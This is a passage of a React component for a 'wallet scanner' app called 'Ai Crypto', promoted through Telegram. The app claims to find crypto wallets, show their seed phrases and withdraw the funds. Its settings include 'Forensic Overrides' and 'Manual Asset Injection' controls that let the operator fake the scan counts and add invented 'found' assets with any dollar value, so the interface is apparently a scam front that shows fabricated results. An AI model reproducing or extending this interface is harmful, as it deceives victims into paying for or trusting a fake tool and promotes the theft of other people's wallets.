                          </div>
                        ) : <div className="text-center text-gray-500 text-sm font-bold uppercase">No data.</div>
                      )}
                    </div>
                  </div>
                </div>
                <div className="shrink-0 p-4 pt-2">
                  <div className="glass-panel rounded-[32px] p-6 border-white/5 flex items-center justify-between">
                    <div className="flex flex-col gap-2">
                      <div className="flex items-center gap-3"><Coins className="w-4 h-4 text-primary" /><span className="text-[0.625rem] font-black text-gray-500 uppercase tracking-[0.4em]">Total Earnings</span></div>
                      <span className="text-3xl font-black text-white font-code tracking-tighter">${totalVal.toLocaleString(undefined, { minimumFractionDigits: 2 })}</span>
                    </div>
                    <Dialog>
                        <DialogTrigger asChild><Button variant="outline" className="h-12 px-6 rounded-xl border-dashed border-primary/30 bg-primary/5"><CreditCard className="w-4 h-4 text-primary mr-2" /><span className="text-[0.5625rem] font-black uppercase text-primary/70">Configure</span></Button></DialogTrigger>
                        <DialogContent className="bg-[#0a0a0f] border-white/10 text-white max-w-md rounded-3xl">
                             <DialogHeader><DialogTitle className="text-xl font-black uppercase tracking-widest flex items-center gap-4"><ShieldCheck className="w-7 h-7 text-primary" /> Configure extraction</DialogTitle></DialogHeader>
                             <div className="space-y-6 py-8">
                               {['Bitcoin (BTC) Address', 'Tether USDT (BEP-20)', 'Solana (SOL)'].map((label, i) => (
                                 <div key={i} className="space-y-3">
                                   <label className="text-[0.625rem] font-bold text-gray-500 uppercase tracking-widest">{label}</label>
                                   <Input value={i === 0 ? payoutBtc : i === 1 ? payoutUsdt : payoutSol} onChange={(e) => i === 0 ? setPayoutBtc(e.target.value) : i === 1 ? setPayoutUsdt(e.target.value) : setPayoutSol(e.target.value)} placeholder={`Enter address...`} className="bg-white/[0.02] border-white/5 h-14 rounded-xl font-code text-xs" />
                                 </div>
                               ))}
                             </div>
                             <DialogFooter><Button disabled={isSavingPayout} onClick={handleSavePayoutAddresses} className="w-full h-14 bg-primary text-black font-black uppercase text-[0.6875rem]">{isSavingPayout ? "Saving..." : "Save Configuration"}</Button></DialogFooter>
                        </DialogContent>
                    </Dialog>
                  </div>
                </div>
              </div>
            )}

            {activeTab === 'settings' && (
              <div className="max-w-4xl mx-auto w-full flex flex-col gap-6 overflow-y-auto no-scrollbar pb-12">
                {/* Performance Tuning */}
                <div className="glass-panel rounded-[32px] p-6 border-white/5 shadow-2xl">
                  <h3 className="text-sm font-black uppercase tracking-[0.2em] mb-6 border-b border-white/10 pb-4 flex items-center gap-3"><Gauge className="w-4 h-4 text-primary" /> Performance Tuning</h3>
                  <div className="space-y-8">
                    {[
                      { icon: Zap, label: 'Scan Velocity (Hz)', value: `${systemIntensity[0]}% Engine Load`, state: systemIntensity, setState: setSystemIntensity, max: 100, step: 1, desc: 'Controls frequency.' },
                      { icon: Layers, label: 'Neural Thread Allocation', value: `${allocatedCores[0]} / 8 Threads`, state: allocatedCores, setState: setAllocatedCores, min: 1, max: 8, step: 1, desc: 'Allocates CPU threads.' }
                    ].map((item, idx) => (
                      <div key={idx} className="space-y-4">
                        <div className="flex items-center justify-between"><div className="flex items-center gap-3"><item.icon className="w-4 h-4 text-primary/70" /><label className="text-xs font-bold text-white uppercase">{item.label}</label></div><span className="text-[0.625rem] font-code text-primary">{item.value}</span></div>
                        <Slider value={item.state} onValueChange={item.setState} min={item.min || 0} max={100} step={1} disabled={isInterrogating} />
                      </div>
                    ))}
                  </div>
                </div>

                {/* Forensic Overrides */}
                <div className="glass-panel rounded-[32px] p-6 border-white/5 shadow-2xl">
                  <h3 className="text-sm font-black uppercase tracking-[0.2em] mb-6 border-b border-white/10 pb-4 flex items-center gap-3"><Database className="w-4 h-4 text-yellow-500" /> Forensic Overrides</h3>
                  <div className="space-y-6">
                    <div className="grid grid-cols-2 gap-4">
                      <div className="space-y-2">
                        <label className="text-[10px] font-bold text-gray-500 uppercase tracking-widest px-1">Wallets Checked</label>
                        <Input 
                          type="number" 
                          value={overrideWalletsChecked} 
                          onChange={(e) => setOverrideWalletsChecked(e.target.value)} 
                          placeholder={visualCount.toString()}
                          className="bg-white/[0.02] border-white/5 h-12 rounded-xl text-white font-code"
                        />
                      </div>
                      <div className="space-y-2">
                        <label className="text-[10px] font-bold text-gray-500 uppercase tracking-widest px-1">Found Wallets</label>
                        <Input 
                          type="number" 
                          value={overrideFoundWallets} 
                          onChange={(e) => setOverrideFoundWallets(e.target.value)} 
                          placeholder={foundWallets.toString()}
                          className="bg-white/[0.02] border-white/5 h-12 rounded-xl text-white font-code"
                        />
                      </div>
                    </div>
                    <Button onClick={applyManualOverrides} className="w-full h-12 bg-white/5 border border-white/10 text-white font-black uppercase text-[0.625rem] hover:bg-white/10">Apply Data Sync</Button>
                    
                    <div className="pt-4 border-t border-white/5 space-y-4">
                      <div className="flex items-center gap-2 mb-2"><PlusCircle className="w-4 h-4 text-primary" /><span className="text-[10px] font-bold text-gray-500 uppercase tracking-widest">Manual Asset Injection</span></div>
                      <div className="grid grid-cols-2 gap-4">
                        <div className="space-y-2">
                          <label className="text-[9px] font-bold text-gray-400 uppercase tracking-widest px-1">Network</label>
                          <Select value={injectNetwork} onValueChange={setInjectNetwork}>
                            <SelectTrigger className="h-12 bg-white/[0.02] border-white/5 rounded-xl"><SelectValue /></SelectTrigger>
                            <SelectContent className="bg-[#0a0a0f] border-white/10">
                              {BLOCKCHAINS.filter(c => c.id !== 'multicoin').map(c => (
                                <SelectItem key={c.id} value={c.name} className="uppercase font-bold text-[0.625rem]">{c.name}</SelectItem>
                              ))}
                            </SelectContent>
                          </Select>
                        </div>
                        <div className="space-y-2">
                          <label className="text-[9px] font-bold text-gray-400 uppercase tracking-widest px-1">Amount (USD)</label>
                          <Input 
                            type="number" 
                            value={injectValue} 
                            onChange={(e) => setInjectValue(e.target.value)} 
                            placeholder="0.00"
                            className="bg-white/[0.02] border-white/5 h-12 rounded-xl text-white font-code"
                          />
                        </div>
                      </div>
                      <Button onClick={handleInjectHit} className="w-full h-12 bg-primary/10 border border-primary/20 text-primary font-black uppercase text-[0.625rem] hover:bg-primary/20">Inject Forensic Hit</Button>
                    </div>
                  </div>
                </div>

                {/* System Control */}
                <div className="glass-panel rounded-[32px] p-6 border-white/5 shadow-2xl">
                    <h3 className="text-sm font-black uppercase tracking-[0.2em] mb-6 border-b border-white/10 pb-4 flex items-center gap-3"><Shield className="w-4 h-4 text-gray-400" /> System Control</h3>
                    <div className="space-y-4">
                        <div className="flex items-center justify-between p-4 rounded-2xl bg-white/[0.02] border border-white/5"><div className="flex items-center gap-3"><RotateCcw className="w-4 h-4 text-red-400" /><p className="text-xs font-bold text-white uppercase">Workstation Reset</p></div><Button variant="outline" size="sm" onClick={clearSession} className="h-9 px-4 text-[0.625rem] uppercase font-black border-red-500/30 text-red-400">Reset Station</Button></div>
                        <div className="flex items-center justify-between p-4 rounded-2xl bg-white/[0.02] border border-white/5"><div className="flex items-center gap-3"><LogOut className="w-4 h-4 text-gray-500" /><p className="text-xs font-bold text-white uppercase">Terminate Operator</p></div><Button variant="outline" size="sm" onClick={handleLogout} className="h-9 px-4 text-[0.625rem] uppercase font-black border-white/20 text-gray-400">Logout</Button></div>
                    </div>
                </div>
              </div>
            )}

            {activeTab === 'about' && (
              <div className="max-w-[1000px] mx-auto w-full flex flex-col gap-8 pb-12 overflow-y-auto no-scrollbar">
                <section className="relative overflow-hidden glass-panel rounded-[40px] p-8 border-primary/20 bg-primary/[0.02] shadow-2xl">
                  <div className="relative z-10 space-y-8">
                    <div className="flex items-center gap-4"><Image src="/logos/logo.png" alt="Logo" width={80} height={80} /><div><h2 className="text-xl font-black uppercase tracking-widest text-white">Ai Crypto</h2><p className="text-[0.6rem] font-bold text-primary uppercase tracking-[0.4em] mt-1">v4.0 Elite System</p></div></div>
                    <p className="text-sm text-gray-400 leading-relaxed">High-performance cryptographic engine for digital asset recovery.</p>
                  </div>
                </section>
                <section className="glass-panel rounded-[32px] p-8 border-white/5 text-center shadow-xl">
                  <h4 className="text-[0.6875rem] font-black uppercase text-white/40 mb-2">Creator & Owner</h4>
                  <a href="https://t.me/CMS_OWNER" target="_blank" rel="noopener noreferrer" className="text-xl font-black text-white hover:text-primary transition-all">Alex Mercer</a>
                </section>
                <section className="glass-panel rounded-[32px] p-8 border-white/5 flex flex-col justify-between shadow-xl">
                  <a href="https://t.me/Ai_Crypto_Software" target="_blank" rel="noopener noreferrer" className="flex items-center justify-center gap-3 w-full py-5 rounded-2xl bg-gradient-to-r from-primary to-accent text-white font-black text-[11px] uppercase"><ExternalLink className="w-4 h-4" /> JOIN TELEGRAM CHANNEL</a>
                </section>
              </div>
            )}
          </div>
      </main>
      
      <div className="fixed bottom-[calc(5rem+env(safe-area-inset-bottom))] left-0 right-0 z-[51] flex justify-center items-center px-4">
        <div className="w-full bg-black/20 backdrop-blur-xl border border-white/10 rounded-3xl">
          {activeTab === 'home' && (scanStep === 1 ? (
            <Button onClick={() => activeBlockchains.length > 0 && setScanStep(2)} className="w-full h-16 rounded-2xl font-black uppercase tracking-[0.3em] bg-gradient-to-r from-[#AD4FE6] to-[#2937A3] text-white">Continue <ChevronRight className="w-5 h-5 ml-3" /></Button>
          ) : (
            <Button 
              onClick={isInterrogating ? stopInterrogation : startInterrogation} 
              className={cn("w-full h-16 rounded-2xl font-black uppercase tracking-[0.3em] bg-gradient-to-b from-gray-200 to-white text-black")}>
              {isInterrogating ? 'STOP' : 'START'}
            </Button>
          ))}
          {activeTab === 'withdraw' && (
            <Dialog>
              <DialogTrigger asChild><Button className="w-full h-16 rounded-2xl font-black uppercase tracking-[0.3em] bg-gradient-to-r from-[#AD4FE6] to-[#2937A3] text-white">Withdraw Assets <ChevronRight className="w-5 h-5 ml-3" /></Button></DialogTrigger>
              <DialogContent className="bg-[#0a0a0f] border-white/10 text-white max-w-md rounded-3xl">
                <DialogHeader><DialogTitle className="text-xl font-black uppercase tracking-widest flex items-center gap-4"><Coins className="w-7 h-7 text-primary" /> Discovered Assets</DialogTitle></DialogHeader>
                <div className="max-h-[50vh] overflow-y-auto no-scrollbar py-4 space-y-3">
                  {discoveredAssets.map((asset) => (
                    <div key={asset.id} className="glass-panel rounded-2xl border-white/5 flex items-center px-4 py-3 gap-4">
                      <img src={COIN_LOGOS[asset.network] || ''} alt={asset.network} className="w-6 h-6 object-contain" />
                      <div className="flex flex-col gap-1 flex-1 min-w-0">
                        <span className="text-[0.8125rem] font-black text-white uppercase tracking-widest">{asset.network}</span>
                        <span className="text-[0.6875rem] font-bold text-green-400 font-code">{asset.value}</span>
                      </div>
                      <Dialog onOpenChange={(open) => !open && setCopied(false)}>
                        <DialogTrigger asChild><Button variant="ghost" size="sm" className="h-9 px-3 border border-primary/20 text-primary">Manual</Button></DialogTrigger>
                        <DialogContent className="bg-[#0a0a0f] border-white/10 text-white max-w-md rounded-3xl">
                          <DialogHeader><DialogTitle className="text-xl font-black uppercase tracking-widest flex items-center gap-4"><Key className="w-7 h-7 text-primary" /> Manual Extraction</DialogTitle></DialogHeader>
                          <div className="py-4 space-y-3">
                              <p className="text-[0.625rem] text-gray-500 uppercase tracking-widest font-bold">RECOVERY SEED PHRASE</p>
                              <div className="glass-panel p-4 rounded-xl font-code text-base text-green-400 tracking-wider text-center break-words select-text">{asset.mnemonic}</div>
                          </div>
                          <DialogFooter><Button onClick={() => { navigator.clipboard.writeText(asset.mnemonic); setCopied(true); }} className="w-full h-12 bg-primary text-black font-black uppercase text-[0.6875rem]">{copied ? 'Copied!' : 'Copy Seed'}</Button></DialogFooter>
                        </DialogContent>
                      </Dialog>
                    </div>
                  ))}
                  {discoveredAssets.length === 0 && <div className="py-12 text-center text-[0.625rem] font-black text-gray-600 uppercase">No assets discovered.</div>}
                </div>
                <DialogFooter><Button onClick={() => { setDiscoveredAssets([]); toast({ title: "Bulk extraction dispatched" }); }} disabled={discoveredAssets.length === 0} className="w-full h-14 bg-primary text-black font-black uppercase text-[0.6875rem]">Withdraw All Assets</Button></DialogFooter>
              </DialogContent>
            </Dialog>
          )}
        </div>
      </div>
      
      <nav className="fixed bottom-0 left-0 right-0 h-20 bg-black/50 backdrop-blur-2xl border-t border-white/10 z-[52] flex justify-around items-center pb-[env(safe-area-inset-bottom)]">
        {navItems.map((item) => (
          <button key={item.id} onClick={() => changeTab(item.id)} className={cn("flex flex-col items-center justify-center w-full h-full transition-colors", activeTab === item.id ? 'text-primary' : 'text-gray-500 hover:text-white')}><item.icon className="w-7 h-7" /></button>
        ))}
      </nav>
    </div>
  )
}
